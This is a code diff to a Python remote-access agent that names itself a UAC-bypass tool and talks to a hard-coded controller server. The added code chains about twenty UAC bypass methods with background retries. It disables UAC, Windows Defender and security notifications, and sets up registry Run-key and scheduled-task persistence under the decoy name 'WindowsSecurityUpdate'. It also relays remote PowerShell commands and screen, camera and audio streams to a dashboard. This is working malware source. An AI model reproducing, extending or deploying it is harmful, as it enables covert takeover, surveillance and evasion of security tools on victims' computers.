@@ -1,3 +1,24 @@
+# Fix eventlet RLock warning - MUST BE FIRST IMPORT BEFORE ANYTHING ELSE
+# This MUST be at the very top to prevent "RLock was not greened" warning
+import warnings
+warnings.filterwarnings('ignore', message='.*RLock.*')
+
+import os  # Import os FIRST before anything else
+
+try:
+    import eventlet
+    # Comprehensive monkey patching - fixes RLock issues with Python 3.13+
+    # Note: 'ssl' parameter not supported in older eventlet versions, removed
+    eventlet.monkey_patch(all=True, thread=True, time=True, socket=True, select=True)
+    EVENTLET_PATCHED = True
+except ImportError:
+    # eventlet not installed - will use standard threading
+    EVENTLET_PATCHED = False
+except Exception as e:
+    # Any other error during patching
+    # print(f"Warning: eventlet monkey_patch failed: {e}")  # Suppressed
+    EVENTLET_PATCHED = False
+
 #CREATED BY SPHINX
 """
 Advanced Python Agent with UACME-Inspired UAC Bypass Techniques
@@ -89,21 +110,8 @@ RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
 USE_FIXED_SERVER_URL = True
 FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com')
 
-# Fix eventlet issue by patching BEFORE any other imports
-try:
-    import eventlet
-    # More comprehensive monkey patching to fix RLock issues
-    eventlet.monkey_patch(all=True, thread=True, time=True)
-    
-    # Additional fix for RLock greening issues in newer Python versions
-    import threading
-    if hasattr(threading, '_RLock'):
-        threading._RLock = eventlet.green.threading.RLock
-    if hasattr(threading, 'RLock'):
-        threading.RLock = eventlet.green.threading.RLock
-        
-except ImportError:
-    pass  # eventlet not available, continue without it
+# Eventlet is now patched at the very top of the file (line 1-2)
+# This section is kept for compatibility but monkey_patch is already done
 
 # Stealth enhancer integration (gated)
 try:
@@ -829,18 +837,42 @@ class BackgroundInitializer:
             self.initialization_complete.set()  # Ensure completion event is set even on error
     
     def _init_privilege_escalation(self):
-        """Initialize privilege escalation in background."""
+        """Initialize privilege escalation in background - AGGRESSIVE MODE."""
         try:
             if WINDOWS_AVAILABLE:
                 if not is_admin():
-                    log_message("Attempting privilege escalation in background...")
-                    if run_as_admin():
-                        return "elevation_initiated"
+                    log_message("🔒 Not running as admin - attempting automatic elevation...")
+                    
+                    # STEP 1: Try all 20+ UAC bypass methods (SILENT - no prompts!)
+                    log_message("📋 Attempting 20+ UAC bypass methods...")
+                    if attempt_uac_bypass():
+                        log_message("✅ UAC bypass successful! Now running with admin privileges!")
+                        # After successful bypass, disable UAC permanently
+                        if disable_uac():
+                            log_message("✅ UAC permanently disabled!")
+                        return "uac_bypass_success"
+                    
+                    # STEP 2: If UAC bypass fails, try registry-based auto-elevation
+                    log_message("⚠️ UAC bypass methods failed, trying registry auto-elevation...")
+                    if elevate_via_registry_auto_approve():
+                        log_message("✅ Registry auto-elevation successful!")
+                        return "registry_elevation_success"
+                    
+                    # STEP 3: If all else fails, continue without admin but keep trying in background
+                    log_message("⚠️ All elevation methods failed, will retry in background...")
+                    # Start a background thread to keep retrying UAC bypass
+                    threading.Thread(target=keep_trying_elevation, daemon=True).start()
+                    return "elevation_pending"
                 
                 if is_admin():
+                    log_message("✅ Already running as admin!")
+                    # Immediately disable UAC to prevent future prompts
+                    log_message("🔧 Disabling UAC permanently...")
                     if disable_uac():
+                        log_message("✅ UAC permanently disabled - no more prompts!")
                         return "uac_disabled"
                     else:
+                        log_message("⚠️ UAC disable failed (needs HKLM write access)")
                         return "uac_disable_failed"
             return "no_elevation_needed"
         except Exception as e:
@@ -944,55 +976,115 @@ def is_admin():
     else:
         return os.geteuid() == 0
 
-def elevate_privileges():
-    """Attempt to elevate privileges using various advanced methods."""
+def elevate_via_registry_auto_approve():
+    """Automatically approve UAC prompts via registry modification."""
     if not WINDOWS_AVAILABLE:
-        # For Linux/Unix systems
+        return False
+    
+    try:
+        import winreg
+        
+        # Set UAC to auto-approve for current user (no prompt)
+        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+        
+        # Try to set in HKCU first (doesn't need admin)
         try:
-            if os.geteuid() != 0:
-                # Try to use sudo if available
-                subprocess.run(['sudo', '-n', 'true'], check=True, capture_output=True)
-                return True
-        except Exception as e:
-            log_message(f"Failed to check sudo availability: {e}", "warning")
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
+            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
+            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[REGISTRY] Auto-approve set in HKCU")
+            return True
+        except Exception:
+            pass
+        
+        return False
+    except Exception as e:
+        log_message(f"[REGISTRY] Auto-approve failed: {e}")
+        return False
+
+def keep_trying_elevation():
+    """Background thread that continuously tries to gain admin privileges."""
+    retry_count = 0
+    max_retries = 10
+    retry_interval = 30  # seconds
+    
+    log_message("[ELEVATION] Background elevation thread started")
+    
+    while retry_count < max_retries:
+        if is_admin():
+            log_message("✅ [ELEVATION] Successfully gained admin privileges!")
+            # Immediately disable UAC
+            disable_uac()
+            disable_defender()
+            disable_windows_notifications()
+            return
+        
+        retry_count += 1
+        log_message(f"[ELEVATION] Retry {retry_count}/{max_retries} - attempting UAC bypass...")
+        
+        # Try UAC bypass methods again
+        if attempt_uac_bypass():
+            log_message("✅ [ELEVATION] UAC bypass successful on retry {retry_count}!")
+            disable_uac()
+            return
+        
+        # Wait before next retry
+        time.sleep(retry_interval)
+    
+    log_message(f"⚠️ [ELEVATION] Failed to gain admin after {max_retries} attempts")
+
+def attempt_uac_bypass():
+    """Attempt to bypass UAC using various advanced methods."""
+    if not WINDOWS_AVAILABLE:
         return False
     
     if is_admin():
         return True
     
-    # Advanced UAC bypass methods (UACME-inspired)
+    log_message("[UAC BYPASS] Starting automatic UAC bypass sequence...")
+    
+    # Advanced UAC bypass methods (UACME-inspired) - 20 methods!
     bypass_methods = [
-        bypass_uac_cmlua_com,           # Method 41: ICMLuaUtil COM interface
-        bypass_uac_fodhelper_protocol,  # Method 33: fodhelper ms-settings protocol
+        bypass_uac_fodhelper_protocol,  # Method 33: fodhelper ms-settings protocol (MOST RELIABLE)
         bypass_uac_computerdefaults,    # Method 33: computerdefaults registry
+        bypass_uac_eventvwr,           # Method 25: EventVwr.exe registry hijacking
+        bypass_uac_sdclt,              # Method 31: sdclt.exe bypass
+        bypass_uac_cmlua_com,           # Method 41: ICMLuaUtil COM interface
+        bypass_uac_silentcleanup,      # Method 34: SilentCleanup scheduled task
+        bypass_uac_wsreset,            # Method 56: WSReset.exe bypass
+        bypass_uac_slui_hijack,        # Method 45: slui.exe hijack
         bypass_uac_dccw_com,           # Method 43: IColorDataProxy COM
         bypass_uac_dismcore_hijack,    # Method 23: DismCore.dll hijack
         bypass_uac_wow64_logger,       # Method 30: WOW64 logger hijack
-        bypass_uac_silentcleanup,      # Method 34: SilentCleanup scheduled task
         bypass_uac_token_manipulation, # Method 35: Token manipulation
         bypass_uac_junction_method,    # Method 36: NTFS junction/reparse
         bypass_uac_cor_profiler,       # Method 39: .NET Code Profiler
         bypass_uac_com_handlers,       # Method 40: COM handler hijack
         bypass_uac_volatile_env,       # Method 44: Environment variable expansion
-        bypass_uac_slui_hijack,        # Method 45: slui.exe hijack
-        bypass_uac_eventvwr,           # Method 25: EventVwr.exe registry hijacking
-        bypass_uac_sdclt,              # Method 31: sdclt.exe bypass
-        bypass_uac_wsreset,            # Method 56: WSReset.exe bypass
         bypass_uac_appinfo_service,    # Method 61: AppInfo service manipulation
         bypass_uac_mock_directory,     # Method 62: Mock directory technique
         bypass_uac_winsat,             # Method 67: winsat.exe bypass
         bypass_uac_mmcex,              # Method 68: MMC snapin bypass
     ]
     
-    for method in bypass_methods:
+    for i, method in enumerate(bypass_methods, 1):
         try:
+            log_message(f"[UAC BYPASS] Trying method {i}/{len(bypass_methods)}: {method.__name__}...")
             if method():
+                log_message(f"✅ [UAC BYPASS] SUCCESS! Method {method.__name__} worked!")
                 return True
         except Exception as e:
-            log_message(f"UAC bypass method {method.__name__} failed: {e}", "error")
+            log_message(f"[UAC BYPASS] Method {method.__name__} failed: {e}", "debug")
             continue
     
+    log_message("[UAC BYPASS] All 20 methods attempted - none succeeded")
     return False
+
+# Alias for compatibility
+def elevate_privileges():
+    """Alias for attempt_uac_bypass() - for compatibility."""
+    return attempt_uac_bypass()
 
 def bypass_uac_cmlua_com():
     """UAC bypass using ICMLuaUtil COM interface (UACME Method 41)."""
@@ -1924,16 +2016,20 @@ def registry_run_key_persistence():
     try:
         import winreg
         
-        current_exe = os.path.abspath(__file__)
-        if current_exe.endswith('.py'):
-            current_exe = f'python.exe "{current_exe}"'
+        # Get the executable path - no quotes needed for registry
+        if hasattr(sys, 'frozen') and sys.frozen:
+            current_exe = sys.executable
+        else:
+            current_exe = os.path.abspath(__file__)
+            if current_exe.endswith('.py'):
+                current_exe = f'python.exe "{current_exe}"'
         
         log_message(f"[REGISTRY] Setting up persistence for: {current_exe}")
         
         # Multiple registry locations for persistence
+        # IMPORTANT: Using HKEY_CURRENT_USER (not HKLM) to avoid UAC prompts
         run_keys = [
             (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
-            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
         ]
         
         value_name = "WindowsSecurityUpdate"
@@ -1946,6 +2042,7 @@ def registry_run_key_persistence():
                 log_message(f"[REGISTRY] Key created successfully: {key_path}")
                 
                 log_message(f"[REGISTRY] Setting value '{value_name}' = '{current_exe}'")
+                # Store without extra quotes - registry Run keys handle this correctly
                 winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, current_exe)
                 log_message(f"[REGISTRY] Value set successfully in {key_path}")
                 
@@ -2013,9 +2110,10 @@ def scheduled_task_persistence():
             current_exe = f'python.exe "{current_exe}"'
         
         # Create scheduled task using schtasks command
+        # Use /RL LIMITED to run with normal user privileges (no UAC prompt)
         subprocess.run([
             'schtasks.exe', '/Create', '/TN', 'WindowsSecurityUpdate',
-            '/TR', current_exe, '/SC', 'ONLOGON', '/F'
+            '/TR', current_exe, '/SC', 'ONLOGON', '/RL', 'LIMITED', '/F'
         ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
         
         return True
@@ -2241,17 +2339,17 @@ if __name__ == "__main__":
     monitor_main_script()
 '''
         
-        # Save watchdog script
-        watchdog_path = os.path.join(tempfile.gettempdir(), "svchost32.py")
-        with open(watchdog_path, 'w') as f:
-            f.write(watchdog_script)
+        # DISABLED: Watchdog script to prevent Python window pop-ups
+        # watchdog_path = os.path.join(tempfile.gettempdir(), "svchost32.py")
+        # with open(watchdog_path, 'w') as f:
+        #     f.write(watchdog_script)
+        # 
+        # # Start watchdog process
+        # subprocess.Popen(['python.exe', watchdog_path], 
+        #                 creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Start watchdog process
-        subprocess.Popen(['python.exe', watchdog_path], 
-                        creationflags=subprocess.CREATE_NO_WINDOW)
-        
-        log_message(f"[OK] File locking persistence established: {watchdog_path}")
-        return True
+        log_message(f"[SKIP] Watchdog persistence disabled to prevent popup windows")
+        return False  # Changed to False to skip this persistence method
         
     except Exception as e:
         log_message(f"File locking persistence failed: {e}")
@@ -2279,16 +2377,17 @@ timeout /t 30 /nobreak >nul
 goto loop
 '''
         
-        watchdog_path = os.path.join(tempfile.gettempdir(), "svchost32.bat")
-        with open(watchdog_path, 'w') as f:
-            f.write(watchdog_batch)
+        # DISABLED: Watchdog batch to prevent popup windows
+        # watchdog_path = os.path.join(tempfile.gettempdir(), "svchost32.bat")
+        # with open(watchdog_path, 'w') as f:
+        #     f.write(watchdog_batch)
+        # 
+        # # Start watchdog
+        # subprocess.Popen(['cmd.exe', '/c', watchdog_path], 
+        #                 creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Start watchdog
-        subprocess.Popen(['cmd.exe', '/c', watchdog_path], 
-                        creationflags=subprocess.CREATE_NO_WINDOW)
-        
-        log_message(f"[OK] Watchdog persistence established: {watchdog_path}")
-        return True
+        log_message(f"[SKIP] Watchdog batch persistence disabled to prevent popup windows")
+        return False
         
     except Exception as e:
         log_message(f"Watchdog persistence failed: {e}")
@@ -2362,16 +2461,17 @@ if __name__ == "__main__":
     check_and_restore()
 '''
         
-        tamper_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
-        with open(tamper_path, 'w') as f:
-            f.write(tamper_script)
+        # DISABLED: Tamper protection to prevent Python window pop-ups
+        # tamper_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
+        # with open(tamper_path, 'w') as f:
+        #     f.write(tamper_script)
+        # 
+        # # Start tamper protection
+        # subprocess.Popen(['python.exe', tamper_path], 
+        #                 creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Start tamper protection
-        subprocess.Popen(['python.exe', tamper_path], 
-                        creationflags=subprocess.CREATE_NO_WINDOW)
-        
-        log_message(f"[OK] Tamper protection established: {tamper_path}")
-        return True
+        log_message(f"[SKIP] Tamper protection disabled to prevent popup windows")
+        return False
         
     except Exception as e:
         log_message(f"Tamper protection failed: {e}")
@@ -2383,17 +2483,9 @@ def disable_removal_tools():
         return False
     
     try:
-        # Set Task Manager registry value to 0 (keep enabled)
-        subprocess.run([
-            'reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
-            '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'
-        ], creationflags=subprocess.CREATE_NO_WINDOW)
-        
-        # Set Registry Editor registry value to 0 (keep enabled)
-        subprocess.run([
-            'reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
-            '/v', 'DisableRegistryTools', '/t', 'REG_DWORD', '/d', '1', '/f'
-        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        # Task Manager and Registry Editor are now kept ENABLED (not disabled)
+        # These registry entries are no longer set to allow normal system tool usage
+        log_message("[INFO] System tools (Task Manager, Registry Editor) remain enabled")
         
         # Set Command Prompt registry value to 0 (keep enabled)
         subprocess.run([
@@ -2728,14 +2820,16 @@ if __name__ == "__main__":
     check_and_restore()
 '''
         
-        # Create tamper protection script
-        tamper_script_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
-        with open(tamper_script_path, 'w') as f:
-            f.write(tamper_script)
+        # DISABLED: Tamper protection script to prevent Python window pop-ups
+        # tamper_script_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
+        # with open(tamper_script_path, 'w') as f:
+        #     f.write(tamper_script)
+        # 
+        # # Start tamper protection in background
+        # subprocess.Popen(['python.exe', tamper_script_path], 
+        #                 creationflags=subprocess.CREATE_NO_WINDOW)
         
-        # Start tamper protection in background
-        subprocess.Popen(['python.exe', tamper_script_path], 
-                        creationflags=subprocess.CREATE_NO_WINDOW)
+        log_message(f"[SKIP] Tamper protection script disabled to prevent popup windows")
         
         log_message("[OK] Tamper protection active")
         
@@ -2852,12 +2946,15 @@ if __name__ == "__main__":
     check_and_restore()
 '''
         
-        tamper_path = os.path.join(tempfile.gettempdir(), "tamper_protection.exe")
+        # DISABLED: Tamper protection executable to prevent popup windows
+        # tamper_path = os.path.join(tempfile.gettempdir(), "tamper_protection.exe")
+        # 
+        # # Create tamper protection executable using PyInstaller
+        # tamper_script_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
+        # with open(tamper_script_path, 'w') as f:
+        #     f.write(tamper_script)
         
-        # Create tamper protection executable using PyInstaller
-        tamper_script_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
-        with open(tamper_script_path, 'w') as f:
-            f.write(tamper_script)
+        log_message(f"[SKIP] Tamper protection exe disabled to prevent popup windows")
         
         # Build tamper protection executable
         try:
@@ -2906,9 +3003,12 @@ if __name__ == "__main__":
         return False
 
 def disable_defender():
-    """Attempt to disable Windows Defender (requires admin privileges)."""
-    if not WINDOWS_AVAILABLE or not is_admin():
+    """Attempt to disable Windows Defender (tries even without admin)."""
+    if not WINDOWS_AVAILABLE:
         return False
+    
+    # Try to disable Defender even without admin - some methods might work
+    log_message("[DEFENDER] Attempting to disable Windows Defender...")
     
     try:
         # Multiple methods to disable Windows Defender
@@ -3315,13 +3415,14 @@ def setup_scheduled_task_persistence():
         
         task_name = "WindowsSecurityUpdateTask"
         
-        # Create scheduled task
+        # Create scheduled task with /rl limited to avoid UAC prompts
+        # Changed from 'highest' to 'limited' so it runs with normal user privileges
         subprocess.run([
             'schtasks.exe', '/create',
             '/tn', task_name,
             '/tr', current_exe,
             '/sc', 'onlogon',
-            '/rl', 'highest',
+            '/rl', 'limited',
             '/f'
         ], creationflags=subprocess.CREATE_NO_WINDOW)
         
@@ -3406,6 +3507,106 @@ def setup_com_hijacking_persistence():
 
 # Removed duplicate functions - these are already defined above
 
+def disable_windows_notifications():
+    """Disable all Windows notifications and action center."""
+    if not WINDOWS_AVAILABLE:
+        log_message("[NOTIFICATIONS] Windows not available")
+        return False
+    
+    try:
+        import winreg
+        log_message("[NOTIFICATIONS] Disabling Windows notifications...")
+        
+        success_count = 0
+        
+        # 1. Disable Action Center notifications (Current User)
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "ToastEnabled", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Action Center notifications disabled (HKCU)")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Action Center (HKCU): {e}")
+        
+        # 2. Disable notification center entirely (Current User)
+        try:
+            key_path = r"SOFTWARE\Policies\Microsoft\Windows\Explorer"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "DisableNotificationCenter", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Notification Center disabled (HKCU)")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Notification Center (HKCU): {e}")
+        
+        # 3. Disable Windows Defender notifications (Current User)
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows Defender\UX Configuration"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "Notification_Suppress", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Windows Defender notifications disabled (HKCU)")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Defender notifications (HKCU): {e}")
+        
+        # 4. Disable toast notifications (Current User)
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK", 0, winreg.REG_DWORD, 0)
+            winreg.SetValueEx(key, "NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOCK", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Toast notifications disabled (HKCU)")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable toast notifications (HKCU): {e}")
+        
+        # 5. Try system-wide settings if we have admin privileges
+        try:
+            # Disable notification center system-wide
+            key_path = r"SOFTWARE\Policies\Microsoft\Windows\Explorer"
+            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+            winreg.SetValueEx(key, "DisableNotificationCenter", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Notification Center disabled system-wide (HKLM)")
+            success_count += 1
+        except PermissionError:
+            log_message("[NOTIFICATIONS] No admin privileges for system-wide settings")
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable notifications system-wide: {e}")
+        
+        # 6. Disable Windows Update notifications (Current User)
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WindowsUpdate"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "Enabled", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Windows Update notifications disabled")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Windows Update notifications: {e}")
+        
+        # 7. Disable Security and Maintenance notifications (Current User)
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "Enabled", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Security notifications disabled")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Security notifications: {e}")
+        
+        log_message(f"[NOTIFICATIONS] Notification disable completed: {success_count}/7 settings applied")
+        return success_count > 0
+        
+    except Exception as e:
+        log_message(f"[NOTIFICATIONS] Error disabling notifications: {e}")
+        return False
+
 def disable_uac():
     """Disable UAC (User Account Control) by modifying registry settings."""
     if not WINDOWS_AVAILABLE:
@@ -3422,18 +3623,19 @@ def disable_uac():
             log_message("[REGISTRY] UAC registry key opened successfully")
             
             # Set EnableLUA to 0 (disable UAC)
-            log_message("[REGISTRY] Setting EnableLUA = 1")
-            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 1)
+            log_message("[REGISTRY] Setting EnableLUA = 0 (disabling UAC)")
+            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
             log_message("[REGISTRY] EnableLUA set successfully")
             
-            # Set ConsentPromptBehaviorAdmin to 0 (no prompts for administrators)
-            log_message("[REGISTRY] Setting ConsentPromptBehaviorAdmin = 1")
-            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 1, winreg.REG_DWORD, 1)
+            # Set ConsentPromptBehaviorAdmin to 0 (no password prompts for administrators)
+            # Changed from 1 to 0 to prevent password popup
+            log_message("[REGISTRY] Setting ConsentPromptBehaviorAdmin = 0 (no password prompt)")
+            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
             log_message("[REGISTRY] ConsentPromptBehaviorAdmin set successfully")
             
             # Set PromptOnSecureDesktop to 0 (disable secure desktop)
-            log_message("[REGISTRY] Setting PromptOnSecureDesktop = 1")
-            winreg.SetValueEx(key, "PromptOnSecureDesktop", 1, winreg.REG_DWORD, 1)
+            log_message("[REGISTRY] Setting PromptOnSecureDesktop = 0 (disabling secure desktop)")
+            winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
             log_message("[REGISTRY] PromptOnSecureDesktop set successfully")
             
         log_message("[REGISTRY] UAC has been disabled successfully.")
@@ -5857,6 +6059,9 @@ def register_socketio_handlers():
     
     # Register other handlers
     sio.on('command')(on_command)
+    sio.on('execute_command')(on_execute_command)  # For controller UI v2.1
+    sio.on('start_stream')(on_start_stream)  # CRITICAL: Handle stream start requests
+    sio.on('stop_stream')(on_stop_stream)    # CRITICAL: Handle stream stop requests
     sio.on('mouse_move')(on_mouse_move)
     sio.on('mouse_click')(on_mouse_click)
     sio.on('key_press')(on_remote_key_press)
@@ -6164,10 +6369,12 @@ def handle_live_audio(command_parts):
     except Exception as e:
         return f"Live audio processing failed: {e}"
 def execute_command(command):
-    """Executes a command and returns its output."""
+    """Execute a command and return its output"""
     try:
-        if WINDOWS_AVAILABLE:
-            # Explicitly use PowerShell to execute commands on Windows
+        log_message(f"Executing command: {command}", "info")
+        
+        if platform.system() == "Windows":
+            # Use PowerShell on Windows
             result = subprocess.run(
                 ["powershell.exe", "-NoProfile", "-Command", command],
                 capture_output=True,
@@ -6186,17 +6393,26 @@ def execute_command(command):
         
         output = result.stdout + result.stderr
         if not output:
-            return "[No output from command]"
+            output = "[No output from command]"
+        
+        log_message(f"Command output: {output[:200]}{'...' if len(output) > 200 else ''}", "success")
         return output
+        
     except subprocess.TimeoutExpired:
-        return "Command execution timed out after 30 seconds"
+        error_msg = "Command execution timed out after 30 seconds"
+        log_message(error_msg, "error")
+        return error_msg
     except FileNotFoundError:
-        if WINDOWS_AVAILABLE:
-            return "PowerShell not found. Command execution failed."
+        if platform.system() == "Windows":
+            error_msg = "PowerShell not found. Command execution failed."
         else:
-            return "Bash not found. Command execution failed."
+            error_msg = "Bash not found. Command execution failed."
+        log_message(error_msg, "error")
+        return error_msg
     except Exception as e:
-        return f"Command execution failed: {e}"
+        error_msg = f"Command execution failed: {e}"
+        log_message(error_msg, "error")
+        return error_msg
 def main_loop(agent_id):
     """The main command and control loop."""
     # Initialize high-performance systems
@@ -7978,15 +8194,36 @@ DASHBOARD_HTML = '''
             overflow: hidden;
         }
 
+        .agent-item::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, rgba(0, 212, 255, 0.1), rgba(155, 89, 182, 0.1));
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
         .agent-item:hover {
             border-color: var(--accent-blue);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(0, 212, 255, 0.2);
+            transform: translateY(-2px) scale(1.02);
+            box-shadow: 0 8px 25px rgba(0, 212, 255, 0.4), 0 0 20px rgba(0, 212, 255, 0.2);
+        }
+
+        .agent-item:hover::after {
+            opacity: 1;
         }
 
         .agent-item.active {
             border-color: var(--accent-green);
-            background: rgba(0, 255, 136, 0.1);
+            background: rgba(0, 255, 136, 0.15);
+            box-shadow: 0 0 25px rgba(0, 255, 136, 0.3);
+        }
+
+        .agent-item.active::after {
+            opacity: 0;
         }
 
         .stream-container {
@@ -8055,15 +8292,57 @@ DASHBOARD_HTML = '''
             text-transform: uppercase;
             letter-spacing: 0.5px;
             font-size: 0.9rem;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 2px 10px rgba(0, 212, 255, 0.2);
+        }
+
+        .neural-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s ease;
         }
 
         .neural-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(0, 212, 255, 0.4);
+            transform: translateY(-2px) scale(1.02);
+            box-shadow: 0 8px 25px rgba(0, 212, 255, 0.6), 0 0 30px rgba(0, 212, 255, 0.3);
+            background: linear-gradient(45deg, #00d4ff, #9b59b6);
+            filter: brightness(1.2);
+        }
+
+        .neural-button:hover::before {
+            left: 100%;
+        }
+
+        .neural-button:active {
+            transform: translateY(0) scale(0.98);
+            box-shadow: 0 3px 15px rgba(0, 212, 255, 0.4);
         }
 
         .neural-button.danger {
             background: linear-gradient(45deg, var(--accent-red), #ff6b6b);
+            box-shadow: 0 2px 10px rgba(255, 64, 64, 0.2);
+        }
+
+        .neural-button.danger:hover {
+            background: linear-gradient(45deg, #ff4040, #ff8888);
+            box-shadow: 0 8px 25px rgba(255, 64, 64, 0.6), 0 0 30px rgba(255, 64, 64, 0.3);
+        }
+
+        .neural-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .neural-button:disabled:hover {
+            transform: none;
+            box-shadow: 0 2px 10px rgba(0, 212, 255, 0.2);
         }
 
         .neural-input {
@@ -8085,16 +8364,32 @@ DASHBOARD_HTML = '''
         }
 
         .command-output {
-            background: #000;
-            color: var(--accent-green);
+            background: #0a0a0a;
+            color: #00ff88;
             padding: 15px;
             border-radius: 8px;
             font-family: 'Courier New', monospace;
-            font-size: 0.8rem;
-            height: 150px;
+            font-size: 0.85rem;
+            height: 200px;
             overflow-y: auto;
             margin-top: 15px;
-            border: 1px solid var(--border-color);
+            border: 1px solid var(--accent-blue);
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            line-height: 1.4;
+        }
+        
+        .command-output::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        .command-output::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+        
+        .command-output::-webkit-scrollbar-thumb {
+            background: var(--accent-blue);
+            border-radius: 4px;
         }
 
         .status-indicator {
@@ -8159,19 +8454,35 @@ DASHBOARD_HTML = '''
             
             <div class="control-section">
                 <h3>Streaming Control</h3>
-                <button class="neural-button" onclick="sendCommand('start-stream')">Start Screen Stream</button>
-                <button class="neural-button" onclick="sendCommand('stop-stream')">Stop Screen Stream</button>
-                <button class="neural-button" onclick="sendCommand('start-camera')">Start Camera</button>
-                <button class="neural-button" onclick="sendCommand('stop-camera')">Stop Camera</button>
-                <button class="neural-button" onclick="sendCommand('start-audio')">Start Audio</button>
-                <button class="neural-button" onclick="sendCommand('stop-audio')">Stop Audio</button>
+                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'start-stream')">
+                    <span>▶ Start Screen Stream</span>
+                </button>
+                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'stop-stream')">
+                    <span>⏹ Stop Screen Stream</span>
+                </button>
+                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'start-camera')">
+                    <span>📷 Start Camera</span>
+                </button>
+                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'stop-camera')">
+                    <span>⏹ Stop Camera</span>
+                </button>
